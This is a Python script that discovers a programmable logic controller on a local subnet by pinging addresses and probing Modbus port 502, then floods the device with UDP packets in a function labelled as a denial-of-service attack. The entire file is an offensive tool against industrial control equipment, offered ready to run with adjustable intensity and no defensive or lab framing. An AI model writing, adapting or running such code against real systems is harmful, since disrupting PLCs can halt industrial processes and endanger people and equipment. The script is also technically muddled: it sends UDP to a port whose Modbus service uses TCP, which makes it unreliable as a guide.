import socket
import time
import sys
import os

# Configuration
# If you know the PLC's IP, set it here directly.  Otherwise, set FIND_PLC_IP to True.
PLC_IP = ""  # Leave blank if you want to discover the PLC's IP
FIND_PLC_IP = True  # Set to True to attempt PLC IP discovery
DISCOVERY_NETWORK = "192.168.1." # Change this to the appropriate network range if PLC is on a different subnet.
PING_COUNT = 3 # Number of pings used to determine if an IP is active.
PORT_TO_FLOOD = 502  # Example: Modbus port. Change based on your PLC's services.
NUM_PACKETS = 1000  # Number of packets to send for the DoS attack
PACKET_SIZE = 1024  # Size of each packet in bytes
SLEEP_BETWEEN_PACKETS = 0.001  # Delay (in seconds) between sending packets (adjust for intensity)



def find_plc_ip(network_prefix, ping_count):
    """
    Attempts to discover the PLC's IP address by pinging a range of addresses.
    This is a very basic discovery method and may not be reliable in all networks.
    Important:  This function assumes the PLC responds to ICMP (ping) requests.

    Args:
        network_prefix: The network prefix to scan (e.g., "192.168.1.")
        ping_count: The number of ping attempts to make.

    Returns:
        The IP address of the PLC if found, otherwise None.
    """
    for i in range(1, 255):  # Iterate through possible IP addresses
        ip_address = network_prefix + str(i)
        try:
            # Use the operating system's ping command
            response = os.system("ping -n " + str(ping_count) + " -w 1000 " + ip_address + " > nul 2>&1")  # Windows
            #response = os.system("ping -c " + str(ping_count) + " -W 1 " + ip_address + " > /dev/null 2>&1")  # Linux/macOS (uncomment this and comment out the Windows line if running on Linux/macOS)

            if response == 0:
                print(f"Possible PLC IP found: {ip_address}")
                # Add more robust checks here if possible.  E.g., attempt to connect on a known PLC port.
                # For example, if you know it uses Modbus (port 502):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)  # Short timeout
                    s.connect((ip_address, 502)) # Try connecting on modbus port to verify its a PLC
                    s.close()
                    print(f"Confirmed: PLC found at {ip_address} (Modbus port 502 open)")
                    return ip_address
                except (socket.error, socket.timeout) as e:
                     print(f"Warning: Modbus connection failed on IP {ip_address}: {e}")


        except Exception as e:
            print(f"Error during ping to {ip_address}: {e}")

    print("PLC IP address not found.")
    return None

def dos_attack(target_ip, port, num_packets, packet_size, sleep_time):
    """
    Performs a simple denial-of-service attack by flooding a target with packets.

    Args:
        target_ip: The IP address of the target device.
        port: The port to send packets to.
        num_packets: The number of packets to send.
        packet_size: The size of each packet in bytes.
        sleep_time: The delay (in seconds) between sending packets.
    """

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Use UDP for simplicity (can be changed)
        bytes_to_send = os.urandom(packet_size)  # Generate random bytes for the payload

        print(f"Starting DoS attack on {target_ip}:{port}...")
        for i in range(num_packets):
            sock.sendto(bytes_to_send, (target_ip, port))
            if (i % 100) == 0:
                print(f"Sent {i} packets...")
            time.sleep(sleep_time)  # Introduce a delay

        print(f"DoS attack finished. Sent {num_packets} packets.")
        sock.close()

    except socket.error as e:
        print(f"Socket error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    if FIND_PLC_IP:
        PLC_IP = find_plc_ip(DISCOVERY_NETWORK, PING_COUNT)
        if not PLC_IP:
            print("Could not find PLC IP. Exiting.")
            sys.exit(1)
    elif not PLC_IP:
        print("PLC_IP is not set and IP discovery is disabled. Please set PLC_IP or enable FIND_PLC_IP.")
        sys.exit(1)

    print(f"Using PLC IP: {PLC_IP}")
    dos_attack(PLC_IP, PORT_TO_FLOOD, NUM_PACKETS, PACKET_SIZE, SLEEP_BETWEEN_PACKETS)